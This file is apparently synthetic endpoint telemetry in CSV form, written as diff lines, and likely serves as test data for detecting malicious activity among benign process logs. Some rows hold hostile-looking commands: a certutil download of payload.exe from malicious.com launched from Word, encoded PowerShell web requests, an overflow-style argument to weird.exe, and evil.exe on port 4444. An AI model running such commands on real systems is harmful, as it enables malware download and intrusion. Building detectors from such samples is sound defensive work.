+2026-03-30 18:21:50,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.185,0,chrome
+2026-03-30 18:21:51,notepad.exe,explorer.exe,notepad file.txt,192.168.1.230,0,chrome
+2026-03-30 18:21:52,explorer.exe,explorer.exe,notepad file.txt,192.168.1.138,0,chrome
+2026-03-30 18:21:53,chrome.exe,explorer.exe,explorer open folder,192.168.1.214,0,chrome
+2026-03-30 18:21:54,explorer.exe,explorer.exe,cmd dir,192.168.1.173,0,chrome
+2026-03-30 18:21:55,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.17,0,chrome
+2026-03-30 18:21:56,notepad.exe,explorer.exe,explorer open folder,192.168.1.57,0,chrome
+2026-03-30 18:21:57,explorer.exe,explorer.exe,notepad file.txt,192.168.1.40,0,chrome
+2026-03-30 18:21:58,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.107,0,chrome
+2026-03-30 18:21:59,notepad.exe,explorer.exe,cmd dir,192.168.1.80,0,chrome
+2026-03-30 18:22:00,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.214,0,chrome
+2026-03-30 18:22:01,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.49,0,chrome
+2026-03-30 18:22:02,explorer.exe,explorer.exe,cmd dir,192.168.1.181,0,chrome
+2026-03-30 18:22:03,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.11,0,chrome
+2026-03-30 18:22:04,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.231,0,chrome
+2026-03-30 18:22:05,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.67,0,chrome
+2026-03-30 18:22:06,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.118,0,chrome
+2026-03-30 18:22:07,chrome.exe,explorer.exe,cmd dir,192.168.1.229,0,chrome
+2026-03-30 18:22:08,cmd.exe,explorer.exe,explorer open folder,192.168.1.103,0,chrome
+2026-03-30 18:22:09,cmd.exe,explorer.exe,cmd dir,192.168.1.143,0,chrome
+2026-03-30 18:22:10,notepad.exe,explorer.exe,cmd dir,192.168.1.88,0,chrome
+2026-03-30 18:22:11,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.167,0,chrome
+2026-03-30 18:22:12,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.79,0,chrome
+2026-03-30 18:22:13,explorer.exe,explorer.exe,explorer open folder,192.168.1.220,0,chrome
+2026-03-30 18:22:14,notepad.exe,explorer.exe,cmd dir,192.168.1.23,0,chrome
+2026-03-30 18:22:15,chrome.exe,explorer.exe,explorer open folder,192.168.1.212,0,chrome
+2026-03-30 18:22:16,chrome.exe,explorer.exe,explorer open folder,192.168.1.45,0,chrome
+2026-03-30 18:22:17,chrome.exe,explorer.exe,notepad file.txt,192.168.1.176,0,chrome
+2026-03-30 18:22:18,chrome.exe,explorer.exe,explorer open folder,192.168.1.37,0,chrome
+2026-03-30 18:22:19,explorer.exe,explorer.exe,explorer open folder,192.168.1.209,0,chrome
+2026-03-30 18:22:20,notepad.exe,explorer.exe,cmd dir,192.168.1.46,0,chrome
+2026-03-30 18:22:21,notepad.exe,explorer.exe,explorer open folder,192.168.1.28,0,chrome
+2026-03-30 18:22:22,notepad.exe,explorer.exe,explorer open folder,192.168.1.9,0,chrome
+2026-03-30 18:22:23,chrome.exe,explorer.exe,cmd dir,192.168.1.176,0,chrome
+2026-03-30 18:22:24,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.180,0,chrome
+2026-03-30 18:22:25,cmd.exe,explorer.exe,explorer open folder,192.168.1.125,0,chrome
+2026-03-30 18:22:26,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.185,0,chrome
+2026-03-30 18:22:27,chrome.exe,explorer.exe,notepad file.txt,192.168.1.226,0,chrome
+2026-03-30 18:22:28,notepad.exe,explorer.exe,notepad file.txt,192.168.1.14,0,chrome
+2026-03-30 18:22:29,explorer.exe,explorer.exe,explorer open folder,192.168.1.225,0,chrome
+2026-03-30 18:22:30,chrome.exe,explorer.exe,notepad file.txt,192.168.1.164,0,chrome
+2026-03-30 18:22:31,notepad.exe,explorer.exe,explorer open folder,192.168.1.20,0,chrome
+2026-03-30 18:22:32,chrome.exe,explorer.exe,cmd dir,192.168.1.39,0,chrome
+2026-03-30 18:22:33,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.144,0,chrome
+2026-03-30 18:22:34,explorer.exe,explorer.exe,notepad file.txt,192.168.1.208,0,chrome
+2026-03-30 18:22:35,cmd.exe,explorer.exe,notepad file.txt,192.168.1.7,0,chrome
+2026-03-30 18:22:36,chrome.exe,explorer.exe,cmd dir,192.168.1.75,0,chrome
+2026-03-30 18:22:37,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.143,0,chrome
+2026-03-30 18:22:38,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.231,0,chrome
+2026-03-30 18:22:39,chrome.exe,explorer.exe,notepad file.txt,192.168.1.28,0,chrome
+2026-03-30 18:22:40,notepad.exe,explorer.exe,cmd dir,192.168.1.93,0,chrome
+2026-03-30 18:22:41,explorer.exe,explorer.exe,explorer open folder,192.168.1.245,0,chrome
+2026-03-30 18:22:42,cmd.exe,explorer.exe,explorer open folder,192.168.1.47,0,chrome
+2026-03-30 18:22:43,notepad.exe,explorer.exe,notepad file.txt,192.168.1.119,0,chrome
+2026-03-30 18:22:44,cmd.exe,explorer.exe,notepad file.txt,192.168.1.157,0,chrome
+2026-03-30 18:22:45,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,23.45.67.89,443,python-requests
+2026-03-30 18:22:46,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,8.8.8.8,443,curl
+2026-03-30 18:22:47,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,80,python-requests
+2026-03-30 18:22:48,powershell.exe,winword.exe,powershell -enc aW52b2tl,45.33.32.156,443,curl
+2026-03-30 18:22:49,powershell.exe,winword.exe,powershell -enc aW52b2tl,1.1.1.1,80,python-requests
+2026-03-30 18:22:50,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
+2026-03-30 18:22:51,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,8.8.8.8,80,winhttp
+2026-03-30 18:22:52,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
+2026-03-30 18:22:53,cmd.exe,explorer.exe,cmd dir,192.168.1.214,0,chrome
+2026-03-30 18:22:54,chrome.exe,explorer.exe,explorer open folder,192.168.1.66,0,chrome
+2026-03-30 18:22:55,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.91,0,chrome
+2026-03-30 18:22:56,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.147,0,chrome
+2026-03-30 18:22:57,cmd.exe,explorer.exe,cmd dir,192.168.1.253,0,chrome
+2026-03-30 18:22:58,explorer.exe,explorer.exe,explorer open folder,192.168.1.85,0,chrome
+2026-03-30 18:22:59,cmd.exe,explorer.exe,cmd dir,192.168.1.35,0,chrome
+2026-03-30 18:23:00,explorer.exe,explorer.exe,notepad file.txt,192.168.1.89,0,chrome
+2026-03-30 18:23:01,chrome.exe,explorer.exe,notepad file.txt,192.168.1.118,0,chrome
+2026-03-30 18:23:02,explorer.exe,explorer.exe,notepad file.txt,192.168.1.44,0,chrome
+2026-03-30 18:23:03,chrome.exe,explorer.exe,cmd dir,192.168.1.46,0,chrome
+2026-03-30 18:23:04,notepad.exe,explorer.exe,cmd dir,192.168.1.237,0,chrome
+2026-03-30 18:23:05,chrome.exe,explorer.exe,notepad file.txt,192.168.1.171,0,chrome
+2026-03-30 18:23:06,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.236,0,chrome
+2026-03-30 18:23:07,cmd.exe,explorer.exe,notepad file.txt,192.168.1.237,0,chrome
+2026-03-30 18:23:08,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.96,0,chrome
+2026-03-30 18:23:09,cmd.exe,explorer.exe,explorer open folder,192.168.1.124,0,chrome
+2026-03-30 18:23:10,cmd.exe,explorer.exe,explorer open folder,192.168.1.66,0,chrome
+2026-03-30 18:23:11,explorer.exe,explorer.exe,cmd dir,192.168.1.6,0,chrome
+2026-03-30 18:23:12,notepad.exe,explorer.exe,notepad file.txt,192.168.1.239,0,chrome
+2026-03-30 18:23:13,explorer.exe,explorer.exe,notepad file.txt,192.168.1.57,0,chrome
+2026-03-30 18:23:14,cmd.exe,explorer.exe,notepad file.txt,192.168.1.155,0,chrome
+2026-03-30 18:23:15,chrome.exe,explorer.exe,notepad file.txt,192.168.1.119,0,chrome
+2026-03-30 18:23:16,explorer.exe,explorer.exe,explorer open folder,192.168.1.160,0,chrome
+2026-03-30 18:23:17,explorer.exe,explorer.exe,notepad file.txt,192.168.1.53,0,chrome
+2026-03-30 18:23:18,cmd.exe,explorer.exe,notepad file.txt,192.168.1.197,0,chrome
+2026-03-30 18:23:19,notepad.exe,explorer.exe,notepad file.txt,192.168.1.142,0,chrome
+2026-03-30 18:23:20,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.226,0,chrome
+2026-03-30 18:23:21,explorer.exe,explorer.exe,notepad file.txt,192.168.1.156,0,chrome
+2026-03-30 18:23:22,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.25,0,chrome
+2026-03-30 18:23:23,explorer.exe,explorer.exe,cmd dir,192.168.1.248,0,chrome
+2026-03-30 18:23:24,cmd.exe,explorer.exe,notepad file.txt,192.168.1.250,0,chrome
+2026-03-30 18:23:25,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.51,0,chrome
+2026-03-30 18:23:26,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.82,0,chrome
+2026-03-30 18:23:27,explorer.exe,explorer.exe,cmd dir,192.168.1.90,0,chrome
+2026-03-30 18:23:28,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.166,0,chrome
+2026-03-30 18:23:29,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.27,0,chrome
+2026-03-30 18:23:30,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.164,0,chrome
+2026-03-30 18:23:31,chrome.exe,explorer.exe,cmd dir,192.168.1.199,0,chrome
+2026-03-30 18:23:32,notepad.exe,explorer.exe,explorer open folder,192.168.1.172,0,chrome
+2026-03-30 18:23:33,cmd.exe,explorer.exe,explorer open folder,192.168.1.241,0,chrome
+2026-03-30 18:23:34,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.216,0,chrome
+2026-03-30 18:23:35,notepad.exe,explorer.exe,explorer open folder,192.168.1.98,0,chrome
+2026-03-30 18:23:36,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.183,0,chrome
+2026-03-30 18:23:37,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.3,0,chrome
+2026-03-30 18:23:38,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.224,0,chrome
+2026-03-30 18:23:39,notepad.exe,explorer.exe,explorer open folder,192.168.1.130,0,chrome
+2026-03-30 18:23:40,explorer.exe,explorer.exe,notepad file.txt,192.168.1.123,0,chrome
+2026-03-30 18:23:41,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.70,0,chrome
+2026-03-30 18:23:42,notepad.exe,explorer.exe,cmd dir,192.168.1.242,0,chrome
+2026-03-30 18:23:43,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.175,0,chrome
+2026-03-30 18:23:44,notepad.exe,explorer.exe,cmd dir,192.168.1.174,0,chrome
+2026-03-30 18:23:45,weird.exe,cmd.exe,weird.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,1.1.1.1,8080,curl
+2026-03-30 18:23:46,cmd.exe,explorer.exe,cmd dir,192.168.1.86,0,chrome
+2026-03-30 18:23:47,explorer.exe,explorer.exe,explorer open folder,192.168.1.165,0,chrome
+2026-03-30 18:23:48,chrome.exe,explorer.exe,cmd dir,192.168.1.71,0,chrome
+2026-03-30 18:23:49,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.220,0,chrome
+2026-03-30 18:23:50,notepad.exe,explorer.exe,notepad file.txt,192.168.1.161,0,chrome
+2026-03-30 18:23:51,explorer.exe,explorer.exe,cmd dir,192.168.1.99,0,chrome
+2026-03-30 18:23:52,explorer.exe,explorer.exe,cmd dir,192.168.1.61,0,chrome
+2026-03-30 18:23:53,chrome.exe,explorer.exe,explorer open folder,192.168.1.120,0,chrome
+2026-03-30 18:23:54,explorer.exe,explorer.exe,cmd dir,192.168.1.182,0,chrome
+2026-03-30 18:23:55,chrome.exe,explorer.exe,cmd dir,192.168.1.69,0,chrome
+2026-03-30 18:23:56,explorer.exe,explorer.exe,cmd dir,192.168.1.250,0,chrome
+2026-03-30 18:23:57,explorer.exe,explorer.exe,cmd dir,192.168.1.226,0,chrome
+2026-03-30 18:23:58,notepad.exe,explorer.exe,notepad file.txt,192.168.1.186,0,chrome
+2026-03-30 18:23:59,explorer.exe,explorer.exe,notepad file.txt,192.168.1.42,0,chrome
+2026-03-30 18:24:00,chrome.exe,explorer.exe,notepad file.txt,192.168.1.211,0,chrome
+2026-03-30 18:24:01,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.144,0,chrome
+2026-03-30 18:24:02,notepad.exe,explorer.exe,notepad file.txt,192.168.1.116,0,chrome
+2026-03-30 18:24:03,notepad.exe,explorer.exe,cmd dir,192.168.1.65,0,chrome
+2026-03-30 18:24:04,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.2,0,chrome
+2026-03-30 18:24:05,cmd.exe,explorer.exe,explorer open folder,192.168.1.188,0,chrome
+2026-03-30 18:24:06,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.86,0,chrome
+2026-03-30 18:24:07,explorer.exe,explorer.exe,explorer open folder,192.168.1.30,0,chrome
+2026-03-30 18:24:08,cmd.exe,explorer.exe,explorer open folder,192.168.1.195,0,chrome
+2026-03-30 18:24:09,explorer.exe,explorer.exe,explorer open folder,192.168.1.107,0,chrome
+2026-03-30 18:24:10,explorer.exe,explorer.exe,cmd dir,192.168.1.209,0,chrome
+2026-03-30 18:24:11,notepad.exe,explorer.exe,cmd dir,192.168.1.201,0,chrome
+2026-03-30 18:24:12,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.73,0,chrome
+2026-03-30 18:24:13,notepad.exe,explorer.exe,cmd dir,192.168.1.123,0,chrome
+2026-03-30 18:24:14,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.91,0,chrome
+2026-03-30 18:24:15,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.220,0,chrome
+2026-03-30 18:24:16,explorer.exe,explorer.exe,notepad file.txt,192.168.1.104,0,chrome
+2026-03-30 18:24:17,chrome.exe,explorer.exe,explorer open folder,192.168.1.162,0,chrome
+2026-03-30 18:24:18,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.78,0,chrome
+2026-03-30 18:24:19,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.68,0,chrome
+2026-03-30 18:24:20,cmd.exe,explorer.exe,notepad file.txt,192.168.1.227,0,chrome
+2026-03-30 18:24:21,explorer.exe,explorer.exe,cmd dir,192.168.1.184,0,chrome
+2026-03-30 18:24:22,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.122,0,chrome
+2026-03-30 18:24:23,explorer.exe,explorer.exe,notepad file.txt,192.168.1.75,0,chrome
+2026-03-30 18:24:24,notepad.exe,explorer.exe,notepad file.txt,192.168.1.22,0,chrome
+2026-03-30 13:00:00,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.5,0,chrome
+2026-03-30 13:00:10,explorer.exe,system,open folder documents,192.168.1.5,0,none
+2026-03-30 13:00:20,notepad.exe,explorer.exe,notepad file.txt,192.168.1.5,0,none
+2026-03-30 13:00:30,powershell.exe,winword.exe,powershell -enc aW52b2tlLXdlYnJlcXVlc3Q=,8.8.8.8,443,python-requests
+2026-03-30 13:00:40,weird.exe,cmd.exe,weird.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,45.33.32.156,8080,curl
+2026-03-30 13:00:50,evil.exe,powershell.exe,C:\Users\Public\evil.exe,23.45.67.89,4444,unknown
+2026-03-30 14:00:00,chrome.exe,explorer.exe,chrome browsing youtube.com,192.168.1.10,0,chrome
+2026-03-30 14:00:10,chrome.exe,explorer.exe,chrome browsing gmail.com,192.168.1.11,0,chrome
+2026-03-30 14:00:20,cmd.exe,explorer.exe,cmd dir,192.168.1.12,0,none
+2026-03-30 14:00:30,unknown_123.exe,explorer.exe,run random tool,34.120.55.1,443,unknown
+2026-03-30 14:00:40,weird.exe,cmd.exe,weird.exe BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB,18.22.33.44,8080,curl
+2026-03-30 15:00:00,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.5,0,chrome
+2026-03-30 15:00:10,chrome.exe,explorer.exe,chrome browsing linkedin.com,192.168.1.6,0,chrome
+2026-03-30 15:00:20,notepad.exe,explorer.exe,notepad file.txt,192.168.1.7,0,none
+2026-03-30 15:00:30,explorer.exe,system,open folder downloads,192.168.1.8,0,none
+2026-03-30 15:00:40,cmd.exe,explorer.exe,cmd dir,192.168.1.9,0,none
